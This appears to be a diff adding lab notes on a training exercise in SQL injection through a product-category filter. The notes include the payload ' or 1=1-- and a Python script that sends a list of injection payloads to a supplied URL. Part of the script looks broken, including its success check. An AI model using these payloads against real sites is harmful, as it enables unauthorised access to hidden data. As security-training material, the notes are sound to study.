@@ -1,0 +1,62 @@
+  
+                    LAB #1 :- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+SELECT * from products where category = 'Gifts' and released = 1
+
+END GOAL := display all products both released and unreleased.
+
+ANALYSIS :- 
+
+SELECT * from products where category='Pets' and released=1
+
+when we entered '
+in backedn SELECT * from products where category=''' and released=1 (it broked the code and server responded with 500)
+still we dont know whether the app is vulnerable to sqli 
+hence we will try with diff datasets
+SELECT * from products where category=''--' and released=1 (this --' will comment rest of the following code)
+and command will look like SELECT * from products where category=''
+
+hence its vulnerable to sqli
+
+now run the following payload 
+
+SELECT * from products where category = '' or 1=1  --' and released=1
+
+code -> python 
+successfull payload :- ' or 1=1--
+
+
+import requests 
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+Proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+payloads = ["' 1=1--","'","1=1","' or 1=1--"]
+
+def exploit_sqli(url,payload):
+    uri='/filter?category='
+    r=requests.get(url + uri + payload, verify=False, proxies=Proxies)
+    if(r.text == "Com-Tool"):
+        return True
+    else:
+        return False
+
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+    except IndexError:
+        print("[-] Usage: %s <url> " % sys.argv[0])
+        print('[-] Exmaple: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)
+    for payload in payloads:
+        if exploit_sqli(url,payload):
+            print(f'[+] attack successfull <you got it> db is vulnerable payload +++ ---> {payload}')
+            exit(-1)
+        else:
+            print("[-] attack unsuccessfull ")
+
+
+        
